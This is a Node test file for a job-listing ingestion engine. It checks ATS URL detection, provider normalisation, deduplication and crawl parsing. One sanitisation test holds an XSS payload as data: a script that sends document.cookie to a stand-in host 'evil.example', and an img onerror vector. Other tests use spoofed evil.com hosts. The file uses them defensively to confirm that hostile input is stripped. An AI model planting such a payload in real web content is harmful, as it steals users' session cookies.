// Seen Job Ingestion engine — tests. Run: node --test lib/jobs/jobs.test.mjs
//
// Covers the non-negotiables: ATS detection + tenant extraction, employer-direct provider
// normalization with provenance, malicious-payload sanitization, multi-source canonical dedup
// (same vacancy → one employer-direct row; same title / different requisition → two), provider
// failure isolation, and Common Crawl CDX tenant parsing. No live network — providers take an
// injected fetch.

import { test } from 'node:test';
import assert from 'node:assert/strict';

import { detectAts, isAggregatorUrl, INGESTABLE_PROVIDERS } from './atsDetect.js';
import { greenhouse, lever, ashby, fetchSourceJobs } from './atsProviders.js';
import { fingerprint, dedupJobs } from './expand.js';
import { tenantsFromCdx } from './discovery.js';

// A fetch that returns the same JSON for any URL (single-call providers).
const mockFetch = (payload, { ok = true } = {}) => async () => ({ ok, json: async () => payload, text: async () => (typeof payload === 'string' ? payload : JSON.stringify(payload)) });

// ── ATS detection ─────────────────────────────────────────────────────────────
test('detectAts extracts provider + tenant from real ATS URLs', () => {
  const cases = [
    ['https://boards.greenhouse.io/target/jobs/123', 'greenhouse', 'target'],
    ['https://job-boards.greenhouse.io/stripe', 'greenhouse', 'stripe'],
    ['https://jobs.lever.co/netflix/abc-123', 'lever', 'netflix'],
    ['https://jobs.ashbyhq.com/linear/some-uuid', 'ashby', 'linear'],
    ['https://apply.workable.com/acme/', 'workable', 'acme'],
    ['https://careers.smartrecruiters.com/Bosch', 'smartrecruiters', 'bosch'],
    ['https://acme.recruitee.com/o/engineer', 'recruitee', 'acme'],
    ['https://tesla.wd1.myworkdayjobs.com/en-US/Tesla/job', 'workday', 'tesla'],
  ];
  for (const [url, provider, tenant] of cases) {
    const hit = detectAts(url);
    assert.ok(hit, `no detect for ${url}`);
    assert.equal(hit.provider, provider, `provider for ${url}`);
    assert.equal(hit.tenant, tenant, `tenant for ${url}`);
    assert.equal(hit.sourceType, 'ATS_DIRECT');
  }
  // ingestable flag: greenhouse yes, workday no (detected but not yet pulled directly)
  assert.equal(detectAts('https://boards.greenhouse.io/target').ingestable, true);
  assert.equal(detectAts('https://tesla.wd1.myworkdayjobs.com/Tesla').ingestable, false);
  assert.ok(INGESTABLE_PROVIDERS.has('greenhouse') && !INGESTABLE_PROVIDERS.has('workday'));
});

test('detectAts rejects non-ATS + reserved-word tenants, and flags aggregators', () => {
  assert.equal(detectAts('https://tesla.com/careers'), null);
  assert.equal(detectAts('https://www.google.com/search'), null);
  assert.equal(detectAts('not a url'), null);
  // SECURITY: a spoofed host must NEVER be mis-detected as an ATS (host is anchored, not substring).
  assert.equal(detectAts('https://boards.greenhouse.io.evil.com/target'), null, 'suffix-spoof host rejected');
  assert.equal(detectAts('https://evil.com/boards.greenhouse.io/target'), null, 'path-embedded host rejected');
  assert.equal(detectAts('https://evil.com/?x=jobs.lever.co/netflix'), null, 'query-embedded host rejected');
  // aggregator redirect URLs are NOT employer-direct
  assert.equal(isAggregatorUrl('https://www.adzuna.com/land/ad/123'), true);
  assert.equal(isAggregatorUrl('https://www.indeed.com/viewjob?jk=abc'), true);
  assert.equal(isAggregatorUrl('https://boards.greenhouse.io/target/jobs/1'), false);
});

// ── Provider normalization + provenance ────────────────────────────────────────
const DESC = 'Prevent theft and protect company assets. Conduct surveillance, write incident reports, and de-escalate difficult situations across the sales floor during every shift.';

test('Greenhouse provider normalizes to a canonical row with employer-direct provenance', async () => {
  const payload = { jobs: [{ id: 5001, title: 'Assets Protection Specialist', location: { name: 'Los Angeles, CA' }, absolute_url: 'https://boards.greenhouse.io/target/jobs/5001', content: `<p>${DESC}</p>` }] };
  const rows = await greenhouse.fetchCompanyJobs('target', { companyName: 'Target', fetchImpl: mockFetch(payload) });
  assert.equal(rows.length, 1);
  const r = rows[0];
  assert.equal(r.title, 'Assets Protection Specialist');
  assert.equal(r.company, 'Target');
  assert.equal(r.apply_url, 'https://boards.greenhouse.io/target/jobs/5001');
  assert.equal(r.source, 'Greenhouse');
  assert.equal(r.source_type, 'ATS_DIRECT');
  assert.equal(r.ats_provider, 'greenhouse');
  assert.equal(r.ats_tenant, 'target');
  assert.equal(r.external_id, '5001');
  assert.ok(r.description.length > 80 && !/[<>]/.test(r.description), 'description cleaned');
});

test('Lever + Ashby providers normalize from their real shapes', async () => {
  const lrows = await lever.fetchCompanyJobs('netflix', { companyName: 'Netflix', fetchImpl: mockFetch([
    { id: 'l-1', text: 'Software Engineer', categories: { location: 'Remote', commitment: 'Full-time' }, hostedUrl: 'https://jobs.lever.co/netflix/l-1', applyUrl: 'https://jobs.lever.co/netflix/l-1/apply', descriptionPlain: DESC },
  ]) });
  assert.equal(lrows.length, 1);
  assert.equal(lrows[0].ats_provider, 'lever');
  assert.equal(lrows[0].external_id, 'l-1');
  assert.equal(lrows[0].apply_url, 'https://jobs.lever.co/netflix/l-1/apply');

  const arows = await ashby.fetchCompanyJobs('linear', { companyName: 'Linear', fetchImpl: mockFetch({ jobs: [
    { id: 'a-9', title: 'Product Designer', location: 'San Francisco', isRemote: false, jobUrl: 'https://jobs.ashbyhq.com/linear/a-9', descriptionPlain: DESC, employmentType: 'FullTime' },
  ] }) });
  assert.equal(arows.length, 1);
  assert.equal(arows[0].ats_provider, 'ashby');
  assert.equal(arows[0].external_id, 'a-9');
});

// ── Malicious payload sanitization ─────────────────────────────────────────────
test('a malicious ATS description is sanitized (no script/HTML survives)', async () => {
  const evil = `<script>fetch('https://evil.example/'+document.cookie)</script>${DESC}<img src=x onerror=alert(1)>`;
  const rows = await greenhouse.fetchCompanyJobs('acme', { companyName: 'Acme', fetchImpl: mockFetch({ jobs: [{ id: 1, title: 'Engineer', location: { name: 'NY' }, absolute_url: 'https://boards.greenhouse.io/acme/jobs/1', content: evil }] }) });
  assert.equal(rows.length, 1);
  const d = rows[0].description;
  assert.ok(!/<script/i.test(d) && !/onerror/i.test(d) && !/[<>]/.test(d), `unsafe content survived: ${d}`);
});

// ── Multi-source canonical dedup ───────────────────────────────────────────────
test('dedup merges the same vacancy across sources but keeps distinct requisitions', () => {
  const gh = { title: 'Software Engineer', company: 'Acme', location: 'Los Angeles, CA', ats_provider: 'greenhouse', external_id: '100', apply_url: 'https://boards.greenhouse.io/acme/jobs/100' };
  const gh2 = { ...gh, external_id: '101', apply_url: 'https://boards.greenhouse.io/acme/jobs/101' };
  const adzunaDup = { title: 'Software Engineer', company: 'Acme', location: 'Los Angeles, CA', source: 'Adzuna', apply_url: 'https://adzuna.com/redirect/xyz' };

  // same vacancy from greenhouse + adzuna → ONE (employer-direct kept, aggregator dup dropped)
  const one = dedupJobs([gh, adzunaDup]);
  assert.equal(one.length, 1);
  assert.equal(one[0].ats_provider, 'greenhouse');

  // two greenhouse requisitions, same title/location → TWO
  const two = dedupJobs([gh, gh2]);
  assert.equal(two.length, 2);

  // both branches together → REQ-100, REQ-101, and the aggregator dup collapses into the reqs
  const all = dedupJobs([gh, gh2, adzunaDup]);
  assert.equal(all.length, 2);

  // two aggregator rows of the same job (no requisitions) → ONE
  assert.equal(dedupJobs([adzunaDup, { ...adzunaDup, apply_url: 'https://adzuna.com/redirect/abc' }]).length, 1);
});

test('fingerprint is case/whitespace-insensitive on title|company|location', () => {
  assert.equal(fingerprint({ title: ' Nurse ', company: 'HCA', location: 'Austin' }), fingerprint({ title: 'nurse', company: 'hca', location: 'austin' }));
});

// ── Provider failure isolation ─────────────────────────────────────────────────
test('a provider error is isolated — never throws, yields empty rows (circuit breaker sees no jobs)', async () => {
  const throwing = async () => { throw new Error('network down'); };
  // A network error is swallowed to empty rows (robust isolation) — it never throws, so one dead
  // provider can never break a multi-source fan-out. The cron treats empty rows as a soft failure,
  // so the circuit breaker still degrades a persistently-failing source.
  const r = await fetchSourceJobs({ provider: 'greenhouse', tenant: 'x', companyName: 'X' }, { fetchImpl: throwing });
  assert.ok(Array.isArray(r.rows) && r.rows.length === 0, 'network error → empty rows, no throw');
  // unknown provider → ok:false, no throw
  const u = await fetchSourceJobs({ provider: 'nope', tenant: 'x' });
  assert.equal(u.ok, false);
  assert.deepEqual(u.rows, []);
  // a non-ok HTTP response → empty rows, no throw
  const empty = await greenhouse.fetchCompanyJobs('x', { fetchImpl: mockFetch(null, { ok: false }) });
  assert.deepEqual(empty, []);
});

// ── Common Crawl CDX parsing ───────────────────────────────────────────────────
test('tenantsFromCdx extracts ingestable tenants from a CDX JSONL response', () => {
  const jsonl = [
    JSON.stringify({ url: 'https://boards.greenhouse.io/airbnb/jobs/42', status: '200' }),
    JSON.stringify({ url: 'https://jobs.lever.co/spotify', status: '200' }),
    JSON.stringify({ url: 'https://boards.greenhouse.io/airbnb/jobs/43', status: '200' }), // dup tenant
    JSON.stringify({ url: 'https://tesla.wd1.myworkdayjobs.com/x', status: '200' }), // workday → not ingestable, skipped
    JSON.stringify({ url: 'https://boards.greenhouse.io/dead/jobs/1', status: '404' }), // non-200 skipped
    'not json',
  ].join('\n');
  const tenants = tenantsFromCdx(jsonl);
  const keys = tenants.map((t) => `${t.provider}:${t.tenant}`).sort();
  assert.deepEqual(keys, ['greenhouse:airbnb', 'lever:spotify']);
});
